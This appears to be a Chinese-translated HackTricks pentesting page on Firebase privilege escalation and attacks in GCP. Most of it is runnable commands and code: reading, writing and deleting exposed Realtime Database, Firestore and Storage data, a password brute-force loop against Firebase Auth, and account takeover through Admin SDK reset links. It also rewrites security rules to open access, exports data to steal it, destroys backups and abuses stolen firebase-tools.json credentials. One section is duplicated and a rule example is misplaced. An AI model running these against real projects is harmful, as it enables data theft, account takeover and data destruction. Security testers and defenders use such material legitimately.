# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### 未认证访问 Firebase Realtime Database
攻击者无需任何特定的 Firebase 权限即可实施此攻击。前提是 Firebase Realtime Database 的安全规则存在弱点，即规则被设置为 `.read: true` 或 `.write: true`，允许公开的读取或写入访问。

攻击者必须识别数据库 URL，通常格式为：`https://<project-id>.firebaseio.com/`。

可以通过 mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps)、分析配置文件（例如 google-services.json (Android) 或 GoogleService-Info.plist (iOS)）、检查 web 应用的源代码，或检查网络流量以定位对 `*.firebaseio.com` 域的请求来找到该 URL。

攻击者确认数据库 URL 并检查其是否公开暴露，然后访问数据并可能写入恶意内容。

首先，他们通过在 URL 后追加 .json 来检查数据库是否允许读取访问。
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
如果响应包含 JSON 数据或 null（而不是 "Permission Denied"），数据库就允许读取访问。要检查写入访问，attacker 可以尝试使用 Firebase REST API 发送一个测试写入请求。
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
如果操作成功，数据库还会允许写入访问。

### Cloud Firestore 中的数据暴露
攻击者不需要任何特定的 Firebase 权限即可执行此攻击。它仅要求 Cloud Firestore 安全规则中存在易受攻击的配置，即规则在未认证或验证不足的情况下允许读取或写入访问。一个授予完全访问权限的错误配置规则示例是：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
该规则允许任何人无限制地读取和写入所有文档。Firestore 规则具有粒度性，并按 collection 和 document 应用，因此特定规则中的错误可能只会暴露某些集合。

攻击者必须识别 Firebase Project ID，可通过 mobile app reverse engineering、分析配置文件（例如 google-services.json 或 GoogleService-Info.plist）、检查 web 应用的源代码，或分析网络流量以识别对 firestore.googleapis.com 的请求来找到。

Firestore REST API 使用的格式为：
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
如果规则允许未认证的读取访问，攻击者可以读取集合和文档。首先，他们尝试访问一个特定的集合：
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
如果响应包含 JSON 文档而不是 permission error，则该 collection 暴露。攻击者可以通过尝试常见名称或分析应用的结构来枚举所有可访问的 collections。要访问特定 document：
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
如果规则允许未认证的写入访问或验证不足，攻击者可以创建新的文档:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
要修改现有文档，应使用 PATCH：
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
用于删除文档并造成拒绝服务：
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Firebase Storage 中文件暴露
攻击者不需要任何特定的 Firebase 权限就能执行此攻击。只要 Firebase Storage 的 security rules 存在易受攻击的配置，即规则在未认证或验证不足的情况下允许 read 或 write access，就足以被利用。Storage rules 独立控制 read 和 write 权限，因此规则中的错误可能仅暴露 read 权限、仅暴露 write 权限，或两者皆暴露。下面是一个授予 full access 的错误配置示例：
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
该规则允许对所有文档进行读写访问，没有任何限制。Firestore 规则是细粒度的，并按集合和文档逐一应用，因此特定规则的错误可能只会暴露某些集合。攻击者需要识别 Firebase Project ID，可通过对移动应用进行逆向工程、分析配置文件（例如 google-services.json 或 GoogleService-Info.plist）、检查 web 应用源码，或通过网络流量分析识别对 firestore.googleapis.com 的请求来发现。

The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

如果规则允许未认证的读取访问，攻击者就可以读取集合和文档。首先，他们会尝试访问特定集合。
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
如果响应包含文件列表而不是权限错误，则该文件被暴露。attacker 可以通过指定其路径来查看文件内容：
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
如果规则允许未认证的写入访问或校验不足，攻击者可以上传恶意文件。要通过 REST API 上传文件：
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
攻击者可以上传 code shells、malware payloads 或大型文件 来导致 a denial of service。如果应用处理或执行上传的文件，攻击者可能实现 remote code execution。要删除文件并造成 a denial of service：
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### 调用公开的 Firebase Cloud Functions
An attacker 不需要任何特定的 Firebase 权限来利用此问题；只要该 Cloud Function 在 HTTP 上公开可访问且无需身份验证即可。

当配置不安全时，函数容易受到攻击：

- 它使用 functions.https.onRequest，该方法不强制身份验证（不同于 onCall functions）。
- 该函数的代码不验证用户身份（例如，没有检查 request.auth 或 context.auth）。
- 该函数在 IAM 中公开可访问，即 allUsers 拥有 roles/cloudfunctions.invoker 角色。对于 HTTP functions，这是默认行为，除非开发者限制访问。

Firebase HTTP Cloud Functions 通过如下 URL 暴露：

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

An attacker 可以通过源代码分析、网络流量检查、枚举工具或移动应用逆向工程发现这些 URL。  
如果该函数公开暴露且无需认证，attacker 可以在不提供凭据的情况下直接调用它。
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
如果该函数未正确验证输入，攻击者可能会尝试其他攻击，例如 code injection 或 command injection。

### Brute-force attack against Firebase Authentication（密码策略较弱）
攻击者不需要任何特定的 Firebase 权限即可发起此攻击。只要 Firebase API Key 在移动或 web 应用中暴露，并且密码策略未被配置为比默认更严格的要求，即可实施。

攻击者必须识别 Firebase API Key，可以通过 mobile app reverse engineering、分析诸如 google-services.json 或 GoogleService-Info.plist 之类的配置文件、检查 web 应用的源代码（例如在 bootstrap.js 中），或分析网络流量来发现。

Firebase Authentication 的 REST API 使用端点:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
来使用电子邮件和密码进行认证。

如果 Email Enumeration Protection 被禁用，API 错误响应可能会泄露电子邮件是否存在于系统中（EMAIL_NOT_FOUND vs. INVALID_PASSWORD），这使攻击者可以在尝试猜密码之前枚举用户。当该保护启用时，API 对不存在的电子邮件和错误密码返回相同的错误消息，从而防止了用户枚举。

需要注意的是，Firebase Authentication 会实施速率限制，如果在短时间内发生过多的认证尝试，可能会阻止请求。因此，攻击者必须在尝试之间引入延迟以避免被速率限制。

攻击者识别 API Key，并针对已知账户使用多个密码进行认证尝试。如果 Email Enumeration Protection 被禁用，攻击者可以通过分析错误响应来枚举现有用户：
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
如果响应包含 EMAIL_NOT_FOUND，则该电子邮件在系统中不存在。如果响应包含 INVALID_PASSWORD，则该电子邮箱存在，但密码不正确，从而确认该用户已注册。一旦确认有效用户，攻击者可以执行 brute-force 尝试。在尝试之间加入暂停以避免触发 Firebase Authentication 的速率限制机制非常重要：
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
在默认的密码策略下（最少 6 个字符，无复杂性要求），攻击者可以尝试所有可能的 6 字符密码组合。与更严格的密码策略相比，这代表了相对较小的搜索空间。

### Firebase Authentication 中的用户管理

攻击者需要特定的 Firebase Authentication 权限来执行此攻击。所需的权限包括：

- `firebaseauth.users.create` 用于创建用户
- `firebaseauth.users.update` 用于修改现有用户
- `firebaseauth.users.delete` 用于删除用户
- `firebaseauth.users.get` 用于检索用户信息
- `firebaseauth.users.sendEmail` 用于向用户发送电子邮件
- `firebaseauth.users.createSession` 用于创建用户会话

这些权限包含在 `roles/firebaseauth.admin` 角色中，该角色授予对 Firebase Authentication 资源的完整读/写访问权限。它们也包含在更高级别的角色中，例如 roles/firebase.developAdmin（其中包含所有 firebaseauth.* 权限）和 roles/firebase.admin（对所有 Firebase 服务的完全访问权限）。

要使用 Firebase Admin SDK，攻击者需要访问服务帐号凭证（JSON 文件），这些凭证可能存在于被攻陷的系统、公开暴露的代码仓库、被攻陷的 CI/CD 系统，或通过被攻陷的有权访问这些凭证的开发者帐号获取。

第一步是使用服务帐号凭证配置 Firebase Admin SDK。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
为了用受害者的邮箱创建一个恶意用户，攻击者会尝试使用 Firebase Admin SDK 为该邮箱生成一个新账户。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
要修改现有用户，攻击者会更新诸如电子邮件地址、验证状态或账号是否被禁用等字段。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
为了删除用户账户并造成 denial of service，attacker 会发出请求以完全移除该用户。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻击者也可以通过请求用户的 UID 或 email address 来检索现有用户的信息。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
此外，攻击者还可以生成验证链接或密码重置链接，以更改用户的密码并访问其账户。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication 中的用户管理

攻击者需要特定的 Firebase Authentication 权限来执行此攻击。所需权限为：

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

这些权限包含在 `roles/firebaseauth.admin` 角色中，该角色授予对 Firebase Authentication 资源的完全读/写访问权限。它们也属于更高级别的角色，例如 `roles/firebase.developAdmin`（包含所有 firebaseauth.* 权限）和 `roles/firebase.admin`（对所有 Firebase 服务的完全访问权限）。

要使用 Firebase Admin SDK，攻击者需要访问 service account credentials（一个 JSON 文件），这些凭据可能来自被攻陷的系统、公开暴露的代码仓库、被攻破的 CI/CD 环境，或通过被攻破的具有这些凭据访问权限的开发者账号获得。

第一步是使用 service account credentials 配置 Firebase Admin SDK。
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
为了使用受害者的电子邮件创建恶意用户，攻击者会尝试用该电子邮件创建一个新的用户账户，并为其设置自己的密码和个人资料信息。
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
要修改现有用户，attacker 会更改诸如电子邮件地址、验证状态或帐户是否被禁用等字段。
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
为了删除一个用户账户——实际上导致 denial of service——attacker 会发出请求以永久删除该用户。
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
攻击者还可以通过按 UID 或 email 请求用户详细信息来检索现有用户的信息，例如其 UID 或 email。
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
此外，攻击者可以生成 verification links 或 password-reset links，从而更改用户的密码并接管该账户。
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### 在 Firebase 服务中修改安全规则
攻击者需要根据不同服务拥有特定权限才能修改安全规则。对于 Cloud Firestore 和 Firebase Cloud Storage，所需权限为 `firebaserules.rulesets.create`（用于创建 rulesets）和 `firebaserules.releases.create`（用于部署 releases）。这些权限包含在 `roles/firebaserules.admin` 角色中，或包含于更高权限角色，例如 `roles/firebase.developAdmin` 和 `roles/firebase.admin`。对于 Firebase Realtime Database，所需权限为 `firebasedatabase.instances.update`。

攻击者必须使用 Firebase REST API 来修改安全规则。首先，攻击者需要使用 service account credentials 获取 access token。要获取该 token：
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
要修改 Firebase Realtime Database 规则：
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
要修改 Cloud Firestore 规则，攻击者必须先创建一个规则集，然后部署它：
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
上一个命令返回一个规则集名称，格式为 projects/<project-id>/rulesets/<ruleset-id>。要部署新版本，必须使用 PATCH 请求更新 release：
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
要修改 Firebase Cloud Storage 规则：
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
上一个命令返回一个规则集名称，格式为 projects/<project-id>/rulesets/<ruleset-id>。要部署新版本，必须使用 PATCH 请求更新 release：
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestore 中的数据外泄与操作
Cloud Firestore 使用与 Cloud Datastore 相同的基础设施和权限系统，因此 Datastore IAM permissions 直接适用于 Firestore。要操作 TTL 策略，需要 `datastore.indexes.update` 权限。要导出数据，需要 `datastore.databases.export` 权限。要导入数据，需要 datastore.databases.import 权限。要执行批量数据删除，需要 `datastore.databases.bulkDelete` 权限。

对于备份和还原操作，需要特定权限：

- `datastore.backups.get` 和 `datastore.backups.list` 用于列出并检索可用备份的详细信息
- `datastore.backups.delete` 用于删除备份
- `datastore.backups.restoreDatabase` 用于从备份还原数据库
- `datastore.backupSchedules.create` 和 `datastore.backupSchedules.delete` 用于管理备份计划

创建 TTL 策略时，会选择一个指定的属性来标识有资格被删除的实体。该 TTL 属性必须为日期和时间类型。攻击者可以选择一个已存在的属性，或指定一个他们计划稍后添加的属性。如果该字段的值是过去的日期，文档将有资格立即被删除。攻击者可以使用 gcloud CLI 来操作 TTL 策略。
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
为了导出数据并将其外传，攻击者可以使用 gcloud CLI。
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
要导入恶意数据：
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
为了执行大规模数据删除并造成 denial of service，攻击者可以使用 gcloud Firestore bulk-delete tool 来删除整个集合。
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
对于备份和恢复操作，攻击者可以创建计划的 backups 来捕获数据库的当前状态、列出现有 backups、从 backup 恢复以覆盖最近的更改、删除 backups 以造成永久数据丢失，以及移除计划的 backups。
要创建一个每天运行并立即生成 backup 的计划：
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
要从特定的备份恢复，攻击者可以使用该备份中包含的数据创建一个新的数据库。恢复操作会将备份的数据写入一个新的数据库，这意味着不能使用已存在的 DATABASE_ID。
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
要删除备份并导致永久数据丢失：
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI 凭据的窃取与滥用
攻击者不需要特定的 Firebase 权限来执行此攻击，但他们需要访问开发者的本地系统或 Firebase CLI 凭据文件。这些凭据存储在一个 JSON 文件中，位置为：

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

该文件包含认证令牌，包括 refresh_token 和 access_token，这些令牌允许攻击者以最初运行 firebase login 的用户身份进行认证。

攻击者获取到 Firebase CLI 凭据文件后，可以将整个文件复制到自己的系统，Firebase CLI 会自动从其默认位置使用这些凭据。这样一来，攻击者就可以查看该用户可访问的所有 Firebase 项目。
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
